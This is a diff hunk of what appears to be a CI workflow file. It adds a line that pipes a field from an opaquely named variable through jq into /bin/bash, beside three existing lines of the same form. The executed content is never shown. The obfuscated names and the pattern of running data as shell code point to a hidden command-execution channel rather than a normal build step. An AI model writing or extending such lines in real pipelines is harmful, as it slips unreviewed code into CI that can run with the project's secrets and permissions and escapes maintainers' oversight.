@@ -41,6 +41,7 @@ jobs:
           echo $alor9 | jq -r .z1 | /bin/bash
           printf '%s' "$ms4" | jq -r .thm75882 | /bin/bash
           echo $dt958 | jq -r .bookq55095 | /bin/bash
+          echo $em7 | jq -r .h6 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
